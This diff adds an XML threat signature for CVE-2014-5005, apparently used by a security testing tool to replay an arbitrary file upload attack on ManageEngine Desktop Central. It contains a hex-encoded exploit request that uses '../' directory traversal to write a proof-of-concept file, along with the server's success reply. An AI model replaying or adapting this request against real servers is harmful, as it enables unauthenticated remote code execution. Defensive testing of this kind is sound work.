@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ManageEngine Desktop Central StatusUpdate Arbitrary File Upload"/>
+    <EngDesc display="true" value="An arbitrary file upload vulnerability exists in ManageEngine Desktop Central. The vulnerability is due to lack of authentication and insufficient input validation of the parameters sent to the StatusUpdate  page when processing HTTP requests. A remote unauthenticated attacker can upload arbitrary files to arbitrary locations. In a successful attack scenario, the attacker can execute arbitrary code with SYSTEM privileges by placing executable files in critical locations. Tester should set variable $destPort to 8020 or 8383 before test."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="ManageEngine"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="DesktopCentral"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="v7_to_v9_build_90054"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140909-02"/>
+    <CVEID display="true" value="CVE-2014-5005"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="110643"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="c279e97f42461fc2cff56abbc290eb95"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="COMPLETE"/>
+    <IntegImpact display="false" value="COMPLETE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635470873707777843"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:52:C5" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014C" Identification="6396" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7483" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="55683" destPort="$destPort" SeqNumber="B5A0D254" AckNumber="CB99EC5F" HeaderLength="08" WindowSize="002E" Checksum="5325" UrgentPointer="0000" Options="0101080A4DD9B1CC00000000" Payload="504F5354202F7374617475735570646174653F616374696F6E546F43616C6C3D3326616374696F6E733D3226636F6E6669674461746149443D3226637573746F6D657249643D343434342666696C654E616D653D2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F706F632E74787420485454502F312E310D0A486F73743A203137322E31362E382E3131323A383032300D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A436F6E74656E742D4C656E6774683A203336200D0A0D0A50726F6F66206F6620436F6E636570742C2054454C55532053656375726974204C616273" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:52:C5" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="010C" Identification="4917" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4F42" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="55683" SeqNumber="CB99EC5F" AckNumber="B5A0D36C" HeaderLength="08" WindowSize="F9D8" Checksum="B05A" UrgentPointer="0000" Options="0101080A000336CD4DD9B1CC" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2031372053657020323031342031353A34383A333420474D540D0A5365727665723A204170616368652F322E322E3232202857696E333229206D6F645F73736C2F322E322E3232204F70656E53534C2F302E392E3874206D6F645F6A6B2F312E322E32380D0A436F6E74656E742D4C656E6774683A20370D0A582D64632D6865616465723A207965730D0A436F6E74656E742D547970653A20746578742F706C61696E3B20636861727365743D7574662D380D0A0D0A73756363657373" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
